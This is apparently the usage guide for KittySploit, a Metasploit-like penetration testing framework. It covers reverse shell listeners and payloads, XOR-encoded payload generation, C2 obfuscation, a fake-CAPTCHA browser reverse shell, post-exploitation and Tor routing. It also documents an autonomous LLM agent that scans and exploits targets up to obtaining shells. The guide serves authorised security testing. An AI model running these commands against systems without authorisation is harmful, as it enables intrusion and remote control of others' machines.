# KittySploit — Detailed Usage

This guide covers day-to-day usage of the KittySploit framework. For installation, see [README.md](README.md). For the extension registry and catalog, see [kittysploit.com](https://kittysploit.com).

**In this guide:** [Marketplace](#marketplace) · [Agent](#autonomous-agent) · [KittyProxy](#kittyproxy)

---

## Table of Contents

1. [Getting Started](#getting-started)
2. [Console Basics](#console-basics)
3. [Workspaces & Scope](#workspaces-scope)
4. [Autonomous Agent](#autonomous-agent)
5. [Scanner & Workflows](#scanner-workflows)
6. [Manual Exploitation](#manual-exploitation)
7. [KittyProxy](#kittyproxy)
8. [Marketplace](#marketplace)
9. [Collaboration & Automation](#collaboration-automation)
10. [Environment Variables](#environment-variables)
11. [Example Cookbooks](#example-cookbooks)

---

## Getting Started

### Start the console

```bash
python3 kittyconsole.py          # direct
./start_kittysploit.sh           # after install
kittysploit                      # if pip-installed
```

### Startup options

| Flag | Description |
|------|-------------|
| `-q`, `--quiet` | Start without banner |
| `-m MODULE`, `-o "k=v,..."`, `-e` | Run one module non-interactively and exit |
| `--proxy` | Start integrated proxy with interactive CLI |
| `--proxy-host`, `--proxy-port`, `--proxy-mode http\|socks` | Proxy bind settings |
| `-r`, `--rpc` / `-a`, `--api` | Start RPC (8888) or API (5000) server |
| `--api-key` or `KITTYSPLOIT_API_KEY` | Required for RPC/API |
| `-v`, `--version` | Print version |

### One-shot commands (no interactive prompt)

```bash
kittysploit agent target.com --llm-local --llm-model llama3.1:8b
kittysploit scanner -u https://example.com
```

### Non-interactive module execution

```bash
python3 kittyconsole.py -m auxiliary/scanner/http/dir_bruteforce \
  -o "target=example.com,port=443,ssl=true" -e
```

### First launch

On first run, the framework prompts for **charter acceptance** and database encryption setup. Use `doctor` inside the console to verify your environment.

```bash
kittysploit> doctor
kittysploit> agent doctor
```

### Getting help

```bash
help                    # list all commands
help agent              # help for a specific command
tuto                    # module-type tutorials
tuto exploits           # step-by-step for exploits, listeners, etc.
```

---

## Console Basics

The prompt shows your workspace, active sessions, and loaded module:

```
kittysploit (exploits/multi/http/...)>
```

### Module workflow (Metasploit-like)

```bash
search wordpress --type exploits --protocol http
use exploits/multi/http/some_cve
show options
show info
set rhost 192.168.1.100
set rport 443
set ssl true
check                   # if the module supports it
run
back
```

### Module discovery

```bash
show exploits
show auxiliary
show payloads
show listeners
search --cve CVE-2026-24849
sync now                # refresh module index
```

---

## Workspaces & Scope

Organize engagement data per client or assessment:

```bash
workspace list
workspace create client-2026 -d "ACME engagement"
workspace switch client-2026
workspace stats

host --add 10.0.0.15
host --list
vuln --list

scope enable
scope allow ip 10.0.0.0/24
scope allow domain *.client.example
scope rate 30 60
scope check 10.0.0.15

campaign                # attack graph from workspace data
campaign --preview
```

---

## Autonomous Agent

The agent runs a full scan → analyze → reason → exploit → report pipeline.

### Basic usage

```bash
agent target.com
agent https://target.com --threads 10 --safety-profile discreet
agent target.com --no-exploit --goal recon
agent target.com --plan-only --dry-run
```

### Local LLM (Ollama)

```bash
agent target.com --llm-local --llm-model llama3.1:8b
agent target.com --llm-local --llm-endpoint http://127.0.0.1:11434/api/chat
```

### Safety profiles & goals

```bash
agent target.com --goal obtain-shell --approve-risk intrusive
agent target.com --shell-hunter --approve-risk intrusive
agent target.com --profile safe-web --dry-run
agent target.com --profile internal-lab --approve-risk intrusive
```

Risk levels (low → high): `read` → `active` → `intrusive` → `destructive`. Approving a higher level includes lower levels.

### Proxy-aware agent

```bash
proxy start --host 127.0.0.1 --port 8080
# browse the target through the proxy, then:
agent https://target.com --reuse-proxy-auth --http-replay active --approve-active-replay
```

### Resume & diagnostics

```bash
agent --resume agent_20260618T120000_ab12cd34ef
agent doctor
agent doctor --json
agent explain <run_id>
agent replay <run_id>
agent retest <finding_id>
agent profiles
agent metadata
```

---

## Scanner & Workflows

### Bulk scanner

Runs all matching scanner modules against a target:

```bash
scanner -u https://example.com
scanner -u http://192.168.1.100 --threads 10
scanner -u example.com --protocol http --tags ssh
scanner -u example.com --module http/apache_version_check
scanner --list
scanner -u https://example.com --auto-exploit
```

### Declarative workflows

25 bundled workflows are available in `core/workflows/library/`:

`web-recon`, `osint-deep-recon`, `osint-passive-recon`, `service-discovery`, `network-services`, `owasp-quick`, `api-audit`, `client-retest`, `bug-bounty-safe`, `cloud-exposure`, `ad-enum-safe`, `dvwa-lab`, and more.

```bash
workflows list
workflows show web-recon
workflows run web-recon --target example.com --dry-run
workflows run osint-deep-recon -t acme.com --persona_name "Jane Doe"
workflows run owasp-quick -t https://lab.local --set port=8443 --set ssl=true
workflows run client-retest --from-workspace

# Equivalent module path:
use workflow/web-recon
set target example.com
run
```

---

## Manual Exploitation

### Classic reverse shell

```bash
use listeners/multi/reverse_tcp
set lhost 192.168.1.50
set lport 4444
run --background

use exploits/...
set rhost target
set payload payloads/singles/cmd/unix/bash_reverse_tcp
set lhost 192.168.1.50
set lport 4444
run

sessions list
sessions interact <id>
```

### Payload generation

```bash
use payloads/singles/cmd/unix/python_meterpreter_reverse_tcp
set lhost 10.0.0.5
set lport 4444
generate --format python --output shell.py
generate --encoder xor --iterations 3
compatible_payloads        # when an exploit is loaded
```

### Transforms (C2 stream obfuscation)

Listener and payload **must** use the same transform and key:

```bash
use listeners/multi/reverse_tcp
set transform transforms/python/stream/xor
set key mykey
set lhost 192.168.1.50
set lport 4444
run --background
```

See `tuto transforms` for the full walkthrough.

### Post-exploitation

```bash
sessions interact 1
use post/shell/linux/gather/enum_users
set session 1
run
```

### Browser exploitation

```bash
browser_server start
browser_server inject
use browser_exploits/misc/fake_captcha_reverse_shell
run
sessions list
```

### Sessions & jobs

```bash
sessions list
sessions interact <id>
sessions kill <id>
jobs --list
jobs --kill <id>
route                       # pivot routing
```

---

## KittyProxy

### Inside the console

```bash
proxy start --host 127.0.0.1 --port 8080
proxy status
proxy interactive --auto-start
proxy stop
```

### At startup

```bash
python3 kittyconsole.py --proxy --proxy-port 8080
```

Configure your browser or system to use `http://127.0.0.1:8080`. The [KittyProxy extension](https://github.com/SIA-IOTechnology/KittyProxy) adds a web UI for traffic analysis.

The agent can reuse captured flows with `--reuse-proxy-auth` and `--proxy-flow-limit N`.

---

## Marketplace

The marketplace distributes two kinds of artifacts:

| Type | Examples | After install |
|------|----------|---------------|
| **Module** | exploits, auxiliary, scanners, payloads | `use exploits/<name>` then `run` |
| **Extension** | UI tools (KittyProxy, KittyOsint, KittyCosmic, …) | `market launch <id>` or a generated launcher script |

### Browse & search

```bash
market list
market search proxy
market info example-http-exploit
market installed
```

### Account (required to install)

Installation and updates require a marketplace account (`market register` / `market login`). The account is your identity on the registry: purchases of paid exploits or extensions are **linked to it**, not to a single machine.

Once you have bought an item with `market buy <id>`, it stays on your account. You can reinstall it later with `market install <id>` on the same setup or another one after `market login` — **no need to pay again**. The catalog shows owned items as `OWNED` in `market list` / `market info`.

```bash
market register
market login
market buy <id>              # one-time purchase (exploit or extension)
market install <id>          # free if already owned, or if the item is free
```

### Install modules

Modules are installed as stubs under `modules/` and loaded with `use`:

```bash
market install example-http-exploit
market install my-scanner
market install --all-free
market install github:owner/repo
market install /path/to/local/extension   # local folder with extension.toml
```

After installation:

```bash
sync now
use exploits/example_http
show options
run
```

Real module code lives in `extensions/<id>/latest/`; the stub in `modules/` loads it dynamically.

### Install extensions (UI / interface)

UI extensions (web panels, debuggers, protocol analyzers) install into `extensions/<id>/latest/` and generate a launcher at the project root:

```bash
market search "web ui"
market install example-web-ui
market install kittyproxy          # e.g. KittyProxy traffic analysis UI
```

What happens on install:

1. Files are downloaded to `extensions/<id>/latest/`
2. A launcher script is created, e.g. `launch_example_web_ui.py`
3. Configuration may live in `extensions/<id>/latest/config.json`

### Launch extensions

From the console (background job):

```bash
market launch                      # list launchable extensions
market launch example-web-ui
market launch --stop example-web-ui
market launch --foreground example-web-ui
```

Or directly via the generated launcher:

```bash
python launch_example_web_ui.py
./launch_example_web_ui.py
```

### Update & uninstall

```bash
market update                      # all installed items
market update example-web-ui
market uninstall example-http-exploit
market uninstall example-web-ui    # removes extensions/<id>/ and the launcher
market uninstall --all
```

### Publish your own modules & extensions

To create and publish marketplace items, use the example templates in this repository:

- [Example exploit module](examples/marketplace_modules/example_exploit/README.md) — manifest, stub layout, `use` / `run` workflow
- [Example UI extension](examples/marketplace_modules/example_interface/README.md) — launcher, `extension.toml`, web UI structure

Paid publishing and sales require a Pro account on [kittysploit.com](https://kittysploit.com).

---

## Collaboration & Automation

### Real-time collaboration

```bash
collab_server --host 0.0.0.0 -p 8080 -P secretpass -w team1
collab_connect 192.168.1.10 --port 8080 -P secretpass -u alice -w team1
collab_chat
collab_share_module
collab_sync_module
```

Standalone collab web server:

```bash
python3 kittycollab.py -H 0.0.0.0 -p 5005
```

### Metasploit integration

```bash
msf on
msf on --path /opt/metasploit-framework/bin/msfconsole
msf status
msf off
# Prompt becomes kittysploit:msf — use/show/set/run route to MSF
```

### Tor routing

```bash
tor check
tor enable --socks-port 9050
tor status
tor disable
```

### API / RPC servers

```bash
python3 kittyconsole.py -a --api-port 5000 --api-key "$KITTYSPLOIT_API_KEY"
python3 kittyconsole.py -r --rpc-port 8888 --api-key "$KITTYSPLOIT_API_KEY"
```

### MCP (Cursor / IDE integration)

```bash
python3 kittymcp_server.py --transport stdio --accept-charter
kittymcp-client "scan example.com"
```

### Docker lab environments

```bash
use docker_environments/<name>
run
environments list
environments stop dvwa
lab
```

---

## Environment Variables

| Variable | Use |
|----------|-----|
| `KITTYSPLOIT_API_KEY` | API/RPC authentication |
| `KITTYSPLOIT_MASTER_KEY` | Unlock encrypted database |
| `KITTYSPLOIT_HOME` | Framework root override |
| `KITTYSPLOIT_CONFIG` | Config file path |
| `KITTYSPLOIT_DB_PATH` | Database location |
| `KITTYSPLOIT_MCP_ACCEPT_CHARTER` | Non-interactive charter acceptance |
| `KITTYMCP_OLLAMA_*` | MCP Ollama settings |
| `KITTYSPLOIT_NO_COLOR` | Disable colored output |

User data is stored under `~/.kittysploit/` (history, TLS certs, agent runs, etc.).

---

## Example Cookbooks

### A. Quick web recon

```bash
kittysploit
workflows run web-recon --target example.com
```

### B. AI-assisted assessment

```bash
kittysploit agent https://target.com --llm-local --safety-profile discreet --goal recon
```

### C. Manual exploit with listener

```bash
kittysploit
use listeners/multi/reverse_tcp && set lhost 10.0.0.5 && set lport 4444 && run --background
search --cve CVE-2026-XXXX --type exploits
use exploits/...
set rhost target.example.com
check && run
sessions interact 1
```

### D. Proxy → agent chain

```bash
kittysploit --proxy --proxy-port 8080
# configure browser proxy, browse the application
agent https://app.local --reuse-proxy-auth
```

### E. Marketplace module

```bash
market search wordpress
market install my-module
sync now
use exploits/my-module
show options && run
```

### F. Marketplace extension (UI)

```bash
market search "web ui"
market install example-web-ui
market launch example-web-ui
# or: python launch_example_web_ui.py
market launch --stop example-web-ui
```

---

## Further Reading

| Resource | Content |
|----------|---------|
| [README.md](README.md) | Install, quick start, feature overview |
| [kittysploit.com](https://kittysploit.com) | Marketplace catalog, Pro publishing |
| [Example exploit module](examples/marketplace_modules/example_exploit/README.md) | Marketplace module template |
| [Example UI extension](examples/marketplace_modules/example_interface/README.md) | Marketplace extension template |
| `help <command>` | In-console reference for every command |
| `tuto <type>` | Step-by-step tutorials per module type |
